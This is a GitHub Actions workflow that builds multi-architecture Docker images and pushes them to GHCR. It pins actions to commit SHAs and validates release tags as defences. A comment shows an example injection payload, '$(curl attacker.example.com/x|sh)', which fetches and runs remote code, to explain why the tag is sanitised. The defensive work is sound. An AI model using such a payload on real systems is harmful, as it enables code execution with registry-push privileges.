name: Build and Push Docker Image to GHCR

on:
  workflow_dispatch:
    inputs:
      release_tag:
        description: 'Release tag for the image (e.g. 0.10.87). Ignored when "test_push" is checked'
        required: false
        type: string
      test_push:
        description: 'Push as test: tag the image only as "test" (no version tag, no "latest")'
        required: false
        type: boolean
        default: false
      branch:
        description: 'Oobee branch to build from (test push only). Leave blank to use the branch running this workflow'
        required: false
        type: string
  release:
    types: [published]

permissions:
  contents: read
  packages: write

env:
  RELEASE_TAG: ${{ github.event_name == 'release' && github.event.release.tag_name || inputs.release_tag }}
  TEST_PUSH: ${{ github.event_name == 'workflow_dispatch' && inputs.test_push && 'true' || 'false' }}
  REGISTRY: ghcr.io

jobs:
  build:
    strategy:
      fail-fast: false
      matrix:
        include:
          - platform: linux/amd64
            runner: ubuntu-latest
          - platform: linux/arm64
            runner: ubuntu-24.04-arm
    runs-on: ${{ matrix.runner }}
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          ref: ${{ (github.event_name == 'workflow_dispatch' && inputs.test_push && inputs.branch) || github.ref }}

      - name: Set up Docker Buildx
        # asgard-0001 (10 Oct 2026 re-scan): this job holds packages: write +
        # GITHUB_TOKEN, so a repointed mutable tag would let attacker code run
        # with registry-push privileges. Pin to the commit the v3/v6 tags
        # resolved to at review time (verified via GitHub's API, signed
        # commits), matching the SHA-pinning pattern image.yml already uses
        # for softprops/action-gh-release.
        uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9 # v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Lowercase repository name
        id: repo
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"

      - name: Build and push by digest
        id: build
        uses: docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8 # v6
        with:
          context: .
          platforms: ${{ matrix.platform }}
          outputs: type=image,name=${{ env.REGISTRY }}/${{ steps.repo.outputs.name }},push-by-digest=true,name-canonical=true,push=true
          no-cache: true

      - name: Export digest
        run: |
          mkdir -p ${{ runner.temp }}/digests
          digest="${{ steps.build.outputs.digest }}"
          touch "${{ runner.temp }}/digests/${digest#sha256:}"

      - name: Upload digest
        uses: actions/upload-artifact@v4
        with:
          name: digests-${{ matrix.runner }}
          path: ${{ runner.temp }}/digests/*
          if-no-files-found: error
          retention-days: 1

  merge:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Download digests
        uses: actions/download-artifact@v4
        with:
          path: ${{ runner.temp }}/digests
          pattern: digests-*
          merge-multiple: true

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9 # v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Lowercase repository name
        id: repo
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"

      - name: Create and push multi-arch manifest
        working-directory: ${{ runner.temp }}/digests
        # RELEASE_TAG originates from workflow_dispatch inputs (attacker-
        # controllable text) and github.event.release.tag_name (protected-tag
        # controllable, but still string data). Interpolating it directly
        # into the run: block with ${{ }} would splice it into the shell
        # script the runner executes, so a tag such as
        # ``$(curl attacker.example.com/x|sh)`` would run at build time.
        # Pass it via env: and reference it as a shell variable, and reject
        # anything outside the strict tag allowlist before use.
        env:
          RELEASE_TAG: ${{ env.RELEASE_TAG }}
          TEST_PUSH: ${{ env.TEST_PUSH }}
          REGISTRY: ${{ env.REGISTRY }}
          REPO_NAME: ${{ steps.repo.outputs.name }}
        run: |
          set -euo pipefail
          IMAGE="${REGISTRY}/${REPO_NAME}"
          if [ "$TEST_PUSH" = "true" ]; then
            TAG_ARGS=(--tag "${IMAGE}:test")
          else
            if ! printf '%s' "$RELEASE_TAG" | grep -Eq '^[A-Za-z0-9._-]+$'; then
              echo "Refusing to publish: RELEASE_TAG is empty or contains characters outside [A-Za-z0-9._-]" >&2
              exit 1
            fi
            TAG_ARGS=(--tag "${IMAGE}:${RELEASE_TAG}" --tag "${IMAGE}:latest")
          fi
          docker buildx imagetools create \
            "${TAG_ARGS[@]}" \
            $(printf "${IMAGE}@sha256:%s " *)
